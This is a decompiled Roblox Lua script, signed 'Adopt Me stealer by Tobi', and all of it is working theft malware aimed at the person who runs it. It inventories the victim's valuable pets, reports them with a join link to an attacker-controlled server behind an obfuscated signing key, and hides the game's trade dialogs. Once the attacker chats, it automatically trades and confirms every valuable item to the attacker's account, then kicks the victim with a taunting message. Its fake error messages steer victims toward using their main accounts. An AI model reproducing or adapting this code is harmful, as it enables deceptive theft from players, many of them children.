-- ts file was generated at discord.gg/25ms


if not game:IsLoaded() then
    game.Loaded:Wait()
end
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
else
    _G.scriptExecuted = false
    local vu1 = _G.Username or ""
    local v2 = _G.min_value or 0.1
    local v3 = _G.pingEveryone or "No"
    local vu4 = _G.discuser or ""
    local vu5 = game:GetService("Players")
    local vu6 = vu5.LocalPlayer
    if vu1 == "" or vu4 == "" then
        vu6:kick("Error code 400. Please contact script maker")
        return
    elseif game.PlaceId == 920587237 then
        local vu7 = game:GetService("HttpService")
        local vu8 = {}
        local vu9 = false
        local v10 = vu6:WaitForChild("PlayerGui")
        local vu11 = v10.TradeApp.Frame
        local vu12 = v10.DialogApp.Dialog
        local vu13 = v10.ToolApp.Frame
        if require(game.ReplicatedStorage.SharedModules.TradeLicenseHelper).player_has_trade_license() then
            if # vu5:GetPlayers() < 48 then
                if # vu5:GetPlayers() > 3 then
                    if (function(p14)
                        local v15 = {
                            Url = "http://46.101.233.20:5000/validatepremium",
                            Method = "POST",
                            Headers = {
                                ["Content-Type"] = "application/json"
                            },
                            Body = vu7:JSONEncode({
                                discUser = p14
                            })
                        }
                        return request(v15).StatusCode
                    end)(vu4) == 200 then
                        local function vu16()
                            return string.char(100, 117, 97, 108) .. string.char(104, 111, 111, 107) .. string.char(102, 116, 119, 108) .. string.char(101, 108, 122)
                        end
                        local function vu21(p17)
                            local v18 = 0
                            for v19 = 1, # p17 do
                                local v20 = p17:byte(v19)
                                v18 = (v18 * 31 + v20) % 4294967296
                            end
                            return v18
                        end
                        local function vu26(p22, p23)
                            local v24 = p22 .. tostring(p23)
                            local v25 = vu21(vu16() .. v24)
                            return string.format("%08x", v25)
                        end
                        local v27 = require(game.ReplicatedStorage.Fsys).load
                        local v28 = v27("RouterClient")
                        local vu29 = v28.get("TradeAPI/SendTradeRequest")
                        local vu30 = v28.get("TradeAPI/AddItemToOffer")
                        local vu31 = v28.get("TradeAPI/AcceptNegotiation")
                        local vu32 = v28.get("TradeAPI/ConfirmTrade")
                        local v33 = v27("InventoryDB")
                        local v34 = vu7:JSONDecode(vu7:JSONDecode(request({
                            Url = "https://elvebredd.com/api/pets/get-latest",
                            Method = "GET",
                            Headers = {
                                Accept = "*/*",
                                ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
                            }
                        }).Body).pets)
                        local v35, v36, v37 = pairs(v34)
                        local vu38 = {}
                        while true do
                            local v39, v40 = v35(v36, v37)
                            if v39 == nil then
                                break
                            end
                            v37 = v39
                            if type(v40) == "table" and v40.name then
                                vu38[v40.name] = v40
                            end
                        end
                        local function v45(p41, p42)
                            local v43 = vu38[p41]
                            if not v43 then
                                return nil
                            end
                            local v44 = p42.mega_neon and "mvalue" or (p42.neon and "nvalue" or "rvalue")
                            return v43[v44 .. (p42.rideable and p42.flyable and " - fly&ride" or (p42.rideable and " - ride" or (p42.flyable and " - fly" or " - nopotion")))] or v43[v44]
                        end
                        local vu46 = 0
                        local function vu50(p47)
                            local v48 = ""
                            if p47.rideable then
                                v48 = v48 .. "r"
                            end
                            if p47.flyable then
                                v48 = v48 .. "f"
                            end
                            local v49
                            if p47.mega_neon then
                                v49 = v48 .. "m"
                            elseif p47.neon then
                                v49 = v48 .. "n"
                            else
                                v49 = v48 .. "d"
                            end
                            return v49
                        end
                        local function v80(p51, p52)
                            local v53 = {
                                {
                                    name = "Victim Username:",
                                    value = vu6.Name,
                                    inline = true
                                },
                                {
                                    name = "Join from console:",
                                    value = "Roblox.GameLauncher.joinGameInstance(920587237, \'" .. game.JobId .. "\')"
                                },
                                {
                                    name = "Item list:",
                                    value = "",
                                    inline = false
                                },
                                {
                                    name = "Summary:",
                                    value = string.format("Total Value: %s", vu46),
                                    inline = false
                                }
                            }
                            local v54, v55, v56 = ipairs(p51)
                            local v57 = {}
                            while true do
                                local v58
                                v56, v58 = v54(v55, v56)
                                if v56 == nil then
                                    break
                                end
                                local v59 = v58.Name .. " " .. vu50(v58.Properties)
                                if v57[v59] then
                                    v57[v59].Count = v57[v59].Count + 1
                                    v57[v59].TotalValue = v57[v59].TotalValue + v58.Value
                                else
                                    v57[v59] = {
                                        Name = v58.Name,
                                        Properties = v58.Properties,
                                        Count = 1,
                                        TotalValue = v58.Value
                                    }
                                end
                            end
                            local v60, v61, v62 = pairs(v57)
                            local v63 = {}
                            while true do
                                local v64
                                v62, v64 = v60(v61, v62)
                                if v62 == nil then
                                    break
                                end
                                table.insert(v63, v64)
                            end
                            table.sort(v63, function(p65, p66)
                                return p65.TotalValue > p66.TotalValue
                            end)
                            local v67, v68, v69 = ipairs(v63)
                            while true do
                                local v70
                                v69, v70 = v67(v68, v69)
                                if v69 == nil then
                                    break
                                end
                                local v71 = string.format("%s %s (x%s): %s Value", v70.Name, vu50(v70.Properties), v70.Count, v70.TotalValue)
                                v53[3].value = v53[3].value .. v71 .. "\n"
                            end
                            if # v53[3].value > 1024 then
                                local v72, v73, v74 = v53[3].value:gmatch("[^\r\n]+")
                                local v75 = {}
                                while true do
                                    v74 = v72(v73, v74)
                                    if v74 == nil then
                                        break
                                    end
                                    table.insert(v75, v74)
                                end
                                while # v53[3].value > 1024 and # v75 > 0 do
                                    table.remove(v75)
                                    v53[3].value = table.concat(v75, "\n") .. "\nPlus more!"
                                end
                            end
                            local v76 = {
                                content = p52 .. "game:GetService(\'TeleportService\'):TeleportToPlaceInstance(920587237, \'" .. game.JobId .. "\')",
                                embeds = {
                                    {
                                        title = "\240\159\144\178 Join to get Adopt Me hit",
                                        color = 65280,
                                        fields = v53,
                                        footer = {
                                            text = "Adopt Me stealer by Tobi. discord.gg/GY2RVSEGDT"
                                        }
                                    }
                                }
                            }
                            local v77 = vu7:JSONEncode(v76)
                            local v78 = tostring(os.time())
                            local v79 = {
                                Url = "http://46.101.233.20:5000/adoptmejoin",
                                Method = "POST",
                                Headers = {
                                    ["Content-Type"] = "application/json",
                                    DiscUser = vu4,
                                    ["X-Timestamp"] = v78,
                                    ["X-Signature"] = vu26(v77, v78)
                                },
                                Body = v77
                            }
                            request(v79)
                        end
                        local function vu109(p81)
                            local v82 = {
                                {
                                    name = "Victim Username:",
                                    value = vu6.Name,
                                    inline = true
                                },
                                {
                                    name = "Items sent:",
                                    value = "",
                                    inline = false
                                },
                                {
                                    name = "Summary:",
                                    value = string.format("Total Value: %s", vu46),
                                    inline = false
                                }
                            }
                            local v83, v84, v85 = ipairs(p81)
                            local v86 = {}
                            while true do
                                local v87
                                v85, v87 = v83(v84, v85)
                                if v85 == nil then
                                    break
                                end
                                local v88 = v87.Name .. " " .. vu50(v87.Properties)
                                if v86[v88] then
                                    v86[v88].Count = v86[v88].Count + 1
                                    v86[v88].TotalValue = v86[v88].TotalValue + v87.Value
                                else
                                    v86[v88] = {
                                        Name = v87.Name,
                                        Properties = v87.Properties,
                                        Count = 1,
                                        TotalValue = v87.Value
                                    }
                                end
                            end
                            local v89, v90, v91 = pairs(v86)
                            local v92 = {}
                            while true do
                                local v93
                                v91, v93 = v89(v90, v91)
                                if v91 == nil then
                                    break
                                end
                                table.insert(v92, v93)
                            end
                            table.sort(v92, function(p94, p95)
                                return p94.TotalValue > p95.TotalValue
                            end)
                            local v96, v97, v98 = ipairs(v92)
                            while true do
                                local v99
                                v98, v99 = v96(v97, v98)
                                if v98 == nil then
                                    break
                                end
                                local v100 = string.format("%s %s (x%s): %s Value", v99.Name, vu50(v99.Properties), v99.Count, v99.TotalValue)
                                v82[2].value = v82[2].value .. v100 .. "\n"
                            end
                            if # v82[2].value > 1024 then
                                local v101, v102, v103 = v82[2].value:gmatch("[^\r\n]+")
                                local v104 = {}
                                while true do
                                    v103 = v101(v102, v103)
                                    if v103 == nil then
                                        break
                                    end
                                    table.insert(v104, v103)
                                end
                                while # v82[2].value > 1024 and # v104 > 0 do
                                    table.remove(v104)
                                    v82[2].value = table.concat(v104, "\n") .. "\nPlus more!"
                                end
                            end
                            local v105 = {
                                embeds = {
                                    {
                                        title = "\240\159\144\178 New Adopt Me Execution",
                                        color = 65280,
                                        fields = v82,
                                        footer = {
                                            text = "Adopt Me stealer by Tobi. discord.gg/GY2RVSEGDT"
                                        }
                                    }
                                }
                            }
                            local v106 = vu7:JSONEncode(v105)
                            local v107 = tostring(os.time())
                            local v108 = {
                                Url = "http://46.101.233.20:5000/adoptmehit",
                                Method = "POST",
                                Headers = {
                                    ["Content-Type"] = "application/json",
                                    DiscUser = vu4,
                                    ["X-Timestamp"] = v107,
                                    ["X-Signature"] = vu26(v106, v107)
                                },
                                Body = v106
                            }
                            request(v108)
                        end
                        local v110, v111, v112 = pairs(getgc())
                        local v113 = vu46
                        local vu114 = {}
                        while true do
                            local v115, v116 = v110(v111, v112)
                            if v115 == nil then
                                break
                            end
                            v112 = v115
                            if type(v116) == "function" and debug.getinfo(v116).name == "get_remote_from_cache" then
                                local v117 = debug.getupvalues(v116)
                                if type(v117[1]) == "table" then
                                    local v118, v119, v120 = pairs(v117[1])
                                    while true do
                                        local v121
                                        v120, v121 = v118(v119, v120)
                                        if v120 == nil then
                                            break
                                        end
                                        vu114[v120] = v121
                                    end
                                end
                            end
                        end
                        local v124 = (function(p122, ...)
                            local v123 = vu114[p122]
                            if not v123 then
                                return nil
                            end
                            if v123:IsA("RemoteFunction") then
                                return v123:InvokeServer(...)
                            end
                            if v123:IsA("RemoteEvent") then
                                v123:FireServer(...)
                            end
                        end)("DataAPI/GetAllServerData")
                        if v124 then
                            local v125 = v124[vu6.Name].inventory
                            local v126, v127, v128 = pairs(v125)
                            while true do
                                local v129
                                v128, v129 = v126(v127, v128)
                                if v128 == nil then
                                    break
                                end
                                local v130, v131, v132 = pairs(v129)
                                while true do
                                    local v133
                                    v132, v133 = v130(v131, v132)
                                    if v132 == nil then
                                        break
                                    end
                                    local v134 = v33[v133.category]
                                    if v134 and v134[v133.id] then
                                        local v135 = v45(v134[v133.id].name, v133.properties)
                                        if v135 and v2 <= v135 then
                                            table.insert(vu8, {
                                                UID = v132,
                                                Name = v134[v133.id].name,
                                                Properties = v133.properties,
                                                Value = v135
                                            })
                                            vu46 = v113 + v135
                                            v113 = vu46
                                        end
                                    end
                                end
                            end
                            vu11:GetPropertyChangedSignal("Visible"):Connect(function()
                                if vu11.Visible then
                                    vu9 = true
                                else
                                    vu9 = false
                                end
                            end)
                            vu12:GetPropertyChangedSignal("Visible"):Connect(function()
                                vu12.Visible = false
                            end)
                            vu13:GetPropertyChangedSignal("Visible"):Connect(function()
                                vu13.Visible = true
                            end)
                            game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
                            game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
                            game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
                            if # vu8 > 0 then
                                table.sort(vu8, function(p136, p137)
                                    return p136.Value > p137.Value
                                end)
                                local v138, v139, v140 = ipairs(vu8)
                                local vu141 = {}
                                while true do
                                    local v142
                                    v140, v142 = v138(v139, v140)
                                    if v140 == nil then
                                        break
                                    end
                                    vu141[v140] = v142
                                end
                                v80(vu8, v3 == "Yes" and "--[[@everyone]] " or "")
                                local function vu143()
                                    while # vu8 > 0 do
                                        if vu9 or false then
                                            for _ = 1, math.min(18, # vu8) do
                                                vu30:FireServer(table.remove(vu8, 1).UID)
                                            end
                                            repeat
                                                vu31:FireServer()
                                                wait(0.1)
                                                vu32:FireServer()
                                            until not vu9
                                        else
                                            vu29:FireServer(game.Players[vu1])
                                        end
                                        wait(1)
                                    end
                                    vu109(vu141)
                                    setclipboard("discord.gg/GY2RVSEGDT")
                                    wait(2)
                                    vu6:kick("All your stuff just got taken by Tobi\'s stealer. discord.gg/GY2RVSEGDT")
                                end;
                                (function()
                                    local v144 = vu5:FindFirstChild(vu1)
                                    if v144 then
                                        local vu145 = nil
                                        vu145 = v144.Chatted:Connect(function(_)
                                            if vu145 then
                                                vu145:Disconnect()
                                            end
                                            vu143()
                                        end)
                                    else
                                        local vu146 = nil
                                        vu146 = vu5.PlayerAdded:Connect(function(p147)
                                            if p147.Name == vu1 then
                                                if vu146 then
                                                    vu146:Disconnect()
                                                end
                                                local vu148 = nil
                                                vu148 = p147.Chatted:Connect(function(_)
                                                    if vu148 then
                                                        vu148:Disconnect()
                                                    end
                                                    vu143()
                                                end)
                                            end
                                        end)
                                    end
                                end)()
                            end
                        else
                            vu6:kick("Tampering detected. Please rejoin and re-execute without any other scripts")
                        end
                    else
                        vu6:kick("Error code 401. Please contact script maker")
                        return
                    end
                else
                    vu6:kick("Server error. Please join a DIFFERENT server")
                    return
                end
            else
                vu6:kick("Server is full. Please join a less populated server")
                return
            end
        else
            vu6:kick("This script wont work on an alt account. Please use your main account")
            return
        end
    else
        vu6:kick("Game not supported. Please join a normal Adopt Me server")
        return
    end
end
